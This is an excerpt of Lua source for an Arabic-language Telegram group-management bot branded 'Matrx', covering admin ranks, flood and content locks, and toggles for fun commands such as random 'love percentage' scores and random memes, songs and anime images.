DevRio:del(Matrx..'Rio:Ban:'..msg.chat_id_) DevRio:del(Matrx..'Rio:Admins:'..msg.chat_id_) DevRio:del(Matrx..'User:Donky:'..msg.chat_id_) DevRio:del(Matrx..'Rio:VipMem:'..msg.chat_id_) DevRio:del(Matrx..'Rio:Filters:'..msg.chat_id_) DevRio:del(Matrx..'Rio:Muted:'..msg.chat_id_)
...
local basicconstructor = DevRio:smembers(Matrx..'Rio:BasicConstructor:'..msg.chat_id_)
local constructor = DevRio:smembers(Matrx..'Rio:Constructor:'..msg.chat_id_)
local Managers = DevRio:smembers(Matrx..'Rio:Managers:'..msg.chat_id_)
local admins = DevRio:smembers(Matrx..'Rio:Admins:'..msg.chat_id_)
local vipmem = DevRio:smembers(Matrx..'Rio:VipMem:'..msg.chat_id_)
local donky = DevRio:smembers(Matrx..'User:Donky:'..msg.chat_id_)
...
spam_c = DevRio:get(Matrx..'Rio:Spam:Text'..msg.chat_id_)
end
--     Source Matrx     --
if DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source Matrx     --
if DevRio:get(Matrx.."Rio:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevRio:get(Matrx.."Rio:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevRio:get(Matrx.."Rio:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source Matrx     --
if DevRio:get(Matrx..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevRio:get(Matrx..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevRio:get(Matrx.."Rio:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevRio:get(Matrx..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevRio:get(Matrx..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevRio:get(Matrx..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevRio:get(Matrx..'Rio:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevRio:hget(Matrx.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source Matrx     --
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Antk:Rio'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Antk:Rio'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevRio:get(Matrx..'Rio:Antk:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source Matrx     --
if DevRio:get(Matrx..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevRio:del(Matrx..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevRio:del(Matrx..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(Matrx..'Rio:rules'..msg.chat_id_,text)
...
DevRio:set(Matrx..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevRio:get(Matrx..'Rio:rules'..msg.chat_id_)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Zrf:Rio'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الزخرفه بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Zrf:Rio'..msg.chat_id_,true)  
end
if DevRio:get(Matrx..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الزخرفه', 1, 'md')
DevRio:del(Matrx..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevRio:get(Matrx..'Rio:Zrf:Rio'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevRio:setex(Matrx.."Zrf:Rio"..msg.chat_id_..msg.sender_user_id_,300,true)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Brg:Rio'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الابراج بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Brg:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Matrx..'Rio:Brg:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Nsba:Rio'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Nsba:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Matrx..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevRio:set(Matrx..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevRio:get(Matrx..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الحب ', 1, 'md')
DevRio:del(Matrx..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevRio:set(Matrx..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevRio:get(Matrx..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevRio:del(Matrx..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Matrx..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevRio:get(Matrx..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevRio:del(Matrx..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Matrx..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevRio:get(Matrx..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الكره ', 1, 'md')
DevRio:del(Matrx..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Matrx..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevRio:get(Matrx..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevRio:del(Matrx..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Matrx..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevRio:get(Matrx..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevRio:del(Matrx..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevRio:set(Matrx..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevRio:get(Matrx..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevRio:del(Matrx..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Age:Rio'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Age:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Matrx..'Rio:Age:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Mean:Rio'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل معاني الاسماء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Mean:Rio'..msg.chat_id_,true)  
end
if not DevRio:get(Matrx..'Rio:Mean:Rio'..msg.chat_id_) then
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and ChCheck(msg) or text == "تعطيل المتحركه" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevRio:get(Matrx..'Rio:gif:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1075); 
local Text ='*᥀︙تم اختيار المتحركه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/gif:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and ChCheck(msg) or text == "تعطيل الميمز" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevRio:get(Matrx..'Rio:memz:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1201); 
local Text ='*᥀︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/memz:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Audios:Rio'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Audios:Rio'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevRio:get(Matrx..'Rio:Audios:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(4,2824); 
local Text ='*᥀︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/Song:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and ChCheck(msg) or text == "تعطيل اغنيه" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevRio:get(Matrx..'Rio:mp3:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,1167); 
local Text ='*᥀︙تم اختيار الاغنيه لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/mp3:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Remix:Rio'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and ChCheck(msg) or text == "تعطيل الريمكس" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الريمكس'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Remix:Rio'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevRio:get(Matrx..'Rio:Remix:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,612); 
local Text ='*᥀︙تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/remix:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Photo:Rio'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and ChCheck(msg) or text == "تعطيل الصوره" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الصوره'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Photo:Rio'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevRio:get(Matrx..'Rio:Photo:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(4,1171); 
local Text ='*᥀︙تم اختيار الصوره لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/photo:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Anime:Rio'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and ChCheck(msg) or text == "تعطيل الانمي" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الانمي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Anime:Rio'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevRio:get(Matrx..'Rio:Anime:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(3,1002); 
local Text ='*᥀︙تم اختيار صورة الانمي لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/anime:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Movies:Rio'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الافلام'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Movies:Rio'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevRio:get(Matrx..'Rio:Movies:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(45,125); 
local Text ='*᥀︙تم اختيار الفلم لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/Movies:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Matrx..'Rio:Series:Rio'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and ChCheck(msg) then
local MatrxTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المسلسلات'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, MatrxTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Matrx..'Rio:Series:Rio'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevRio:get(Matrx..'Rio:Series:Rio'..msg.chat_id_) and ChCheck(msg) then
Rio = math.random(2,54); 
local Text ='*᥀︙تم اختيار المسلسل لك*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="• مره اخرى •",callback_data="/series:"..msg.sender_user_id_}},{{text = '• Matrx Team •',url="t.me/FZOFZ"}}} 
local msg_id = msg.id_/2097152/0.5 
...
--     Source Matrx     --
if Admin(msg) then
if DevRio:get(Matrx..'Rio:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevRio:get(Matrx..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الروابط ↫ "..mute_links.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevRio:get(Matrx..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙المعرف ↫ "..lock_tag.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevRio:get(Matrx..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙المتحركه ↫ "..mute_gifs.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الملصقات" then if DevRio:get(Matrx..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الملصقات ↫ "..lock_sticker.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الصور" then if DevRio:get(Matrx..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الصور ↫ "..mute_photo.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevRio:get(Matrx..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local MatrxTeam = "\n" .."᥀︙الفيديو ↫ "..mute_video.."\n" Dev_Rio(msg.chat_id_, msg.id_, 1, MatrxTeam, 1, 'md') end
